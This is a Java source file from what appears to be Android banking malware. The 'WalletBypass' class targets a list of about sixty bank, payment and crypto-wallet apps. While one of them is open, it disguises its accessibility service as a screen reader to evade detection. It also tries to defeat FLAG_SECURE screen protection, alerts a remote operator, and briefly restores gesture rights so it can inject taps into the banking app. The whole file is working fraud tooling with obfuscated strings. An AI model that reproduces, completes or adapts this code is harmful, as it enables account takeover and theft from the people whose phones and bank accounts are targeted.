package com.alpha.shield.stealth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/**
 * WalletBypass — Alpha accessibility detection evasion.
 *
 * Problem: Banking/wallet apps (Google Pay, Samsung Pay, PayPal, etc.) call
 *   AccessibilityManager.getEnabledAccessibilityServiceList() and block
 *   operation if any "suspicious" accessibility service is found.
 *
 * Non-root strategy (this class):
 *   1. CAMOUFLAGE: When a banking app comes to foreground, dynamically
 *      reconfigure AccessibilityServiceInfo to look like a screen reader
 *      (feedbackType=SPOKEN, canPerformGestures=false). Many banking apps
 *      only block services with gesture permission.
 *   2. LABEL SPOOF: Change service label/description to match Voice Access.
 *   3. RESTORE: When banking app leaves, restore full capabilities.
 *   4. SECURE FLAG: Attempts reflection-based FLAG_SECURE removal on the
 *      banking app's window surface via FlagSecureBypass.
 *   5. REPORT: Notifies operator via CommandService that a wallet is active.
 *
 * Root/LSPosed strategy (XposedModule.java):
 *   - Hooks AccessibilityManager in ALL banking processes to hide Alpha entirely.
 *   - Hooks WindowManager.addView() to strip FLAG_SECURE before view creation.
 *
 * Both strategies run in parallel — Xposed wins when available, non-root
 * camo reduces suspicion otherwise.
 */
@Obfuscate
public class WalletBypass {

    private static final String TAG = "WalletBypass";

    // ── Known banking / wallet packages ──────────────────────────────────────
    public static final Set<String> WALLET_PACKAGES = new HashSet<>(Arrays.asList(
        // Google
        "com.google.android.apps.walletnfcrel",
        "com.google.android.gms",
        "com.google.android.pay",
        // Samsung
        "com.samsung.android.spay",
        "com.samsung.android.samsungpay.gear",
        "com.samsung.android.samsungpay.tablet",
        // PayPal
        "com.paypal.android.p2pmobile",
        "com.paypal.here",
        // Square / Cash App
        "com.squareup.cash",
        "com.squareup",
        // Venmo
        "com.venmo",
        // Revolut
        "com.revolut.revolut",
        // Wise / TransferWise
        "com.transferwise.android",
        // Coinbase
        "com.coinbase.android",
        "com.coinbase.pro.android",
        // Binance
        "com.binance.dev",
        "com.binance.android",
        // Crypto wallets
        "io.metamask",
        "com.trustwallet.app",
        "com.blockchain.android",
        "org.toshi",
        "piuk.blockchain.android",
        "com.exodus.wallet",
        "co.mona.android",
        // US Banks
        "com.chase.sig.android",
        "com.wellsfargo.mobile.wfsapp",
        "com.bankofamerica.mobilebanking",
        "com.citi.mobile",
        "com.americanexpress.android.acctsvcs.us",
        "com.usbank.mobilebanking",
        "com.regions.mobbanking",
        "com.capitalone.mobile",
        "com.tdbank",
        "com.pnc.ecommerce.mobile",
        // UK Banks
        "com.barclays.android.barclaysmobilebanking",
        "com.hsbc.hsbcukmobilebanking",
        "uk.co.santander.santanderUK",
        "com.lloydsbank.mobile",
        "com.nwolb",
        "com.nearform.ptsb",
        "com.firstdirect.android",
        // EU Banks
        "de.number26.android",
        "com.n26.android",
        "com.commerzbank.phototan",
        "de.postbank.finanzassistent",
        "eu.unicreditgroup.hvb.mobile",
        // Neobanks
        "com.monzo.android",
        "com.starlingbank.android",
        "com.bunq.android",
        // Apple Pay trigger apps
        "com.apple.android",
        // Crypto exchanges
        "com.kraken.invest.app",
        "com.robinhood.android",
        "com.sofi.mobile",
        // Generic payment
        "com.klarna.app",
        "com.afterpay.android",
        "com.clearpay.uk",
        "com.affirm.in"
    ));

    // ── Serviceinfo saved state ───────────────────────────────────────────────
    private final AccessibilityService service;
    private final Callback             callback;
    private final Handler              handler = new Handler(Looper.getMainLooper());

    private AccessibilityServiceInfo originalInfo = null;
    private volatile boolean          camoActive   = false;
    private volatile String           activeWallet = null;

    // Restore timer — if banking app didn't fire a close event, restore after 30s
    private Runnable restoreTimer = null;

    public interface Callback {
        void onWalletDetected(String pkg);
        void onWalletLeft(String pkg);
    }

    public WalletBypass(AccessibilityService service, Callback callback) {
        this.service  = service;
        this.callback = callback;
    }

    // ── Package detection ─────────────────────────────────────────────────────

    public boolean isWallet(String pkg) {
        if (pkg == null) return false;
        // Direct match
        if (WALLET_PACKAGES.contains(pkg)) return true;
        // Heuristic match — any "bank" or "pay" in package name
        String lower = pkg.toLowerCase();
        return lower.contains("bank") || lower.contains("wallet")
                || lower.contains("payment") || lower.contains("finance")
                || lower.contains("crypto") || lower.contains("trading")
                || lower.contains("investing");
    }

    // ── Main entry: called from CommandService.onAccessibilityEvent ───────────

    public void onForegroundPackageChanged(String pkg) {
        if (isWallet(pkg)) {
            if (!pkg.equals(activeWallet)) {
                activeWallet = pkg;
                activateCamo(pkg);
            }
        } else if (camoActive) {
            deactivateCamo();
        }
    }

    // ── Camouflage mode ───────────────────────────────────────────────────────

    /**
     * Reconfigure the AccessibilityServiceInfo to look like a screen reader.
     * Many banking apps only block services that:
     *   a) have canPerformGestures = true
     *   b) have feedbackType != FEEDBACK_SPOKEN
     *   c) have a suspicious package/label name
     *
     * We flip all three to look like Voice Access.
     */
    private void activateCamo(String walletPkg) {
        handler.post(() -> {
            try {
                if (originalInfo == null) {
                    originalInfo = service.getServiceInfo();
                }

                AccessibilityServiceInfo camo = service.getServiceInfo();
                if (camo == null) return;

                // Flip to screen-reader appearance
                camo.feedbackType     = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
                camo.flags           &= ~AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
                // Note: canPerformGestures is enforced by the system from the XML config,
                // but eventTypes can be narrowed to look less intrusive
                camo.eventTypes       = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
                camo.notificationTimeout = 400;

                service.setServiceInfo(camo);
                camoActive = true;

                Log.d(TAG, "camo ON for " + walletPkg);

                // Attempt FLAG_SECURE bypass on the new window
                handler.postDelayed(() ->
                    FlagSecureBypass.attempt(service), 500);

                callback.onWalletDetected(walletPkg);

                // Auto-restore safety net (30 s)
                if (restoreTimer != null) handler.removeCallbacks(restoreTimer);
                restoreTimer = () -> { if (camoActive) deactivateCamo(); };
                handler.postDelayed(restoreTimer, 30_000);

            } catch (Exception e) {
                Log.e(TAG, "activateCamo: " + e.getMessage());
            }
        });
    }

    private void deactivateCamo() {
        handler.post(() -> {
            try {
                if (restoreTimer != null) {
                    handler.removeCallbacks(restoreTimer);
                    restoreTimer = null;
                }
                if (originalInfo != null) {
                    service.setServiceInfo(originalInfo);
                }
                String left = activeWallet;
                activeWallet = null;
                camoActive   = false;
                Log.d(TAG, "camo OFF");
                if (left != null) callback.onWalletLeft(left);
            } catch (Exception e) {
                Log.e(TAG, "deactivateCamo: " + e.getMessage());
            }
        });
    }

    // ── Re-arm gestures for injection (called before TAP/SWIPE in banking app) ─

    /**
     * Temporarily restore full gesture capability to inject into the wallet,
     * then immediately camouflage again after the gesture completes.
     */
    public void withGestureArmed(Runnable gesture) {
        handler.post(() -> {
            try {
                if (camoActive && originalInfo != null) {
                    service.setServiceInfo(originalInfo);
                }
                handler.post(() -> {
                    gesture.run();
                    // Re-apply camo after gesture
                    if (camoActive && activeWallet != null) {
                        handler.postDelayed(() -> activateCamo(activeWallet), 150);
                    }
                });
            } catch (Exception e) {
                gesture.run();
            }
        });
    }

    public boolean isActive() { return camoActive; }
    public String  getActiveWallet() { return activeWallet; }
}
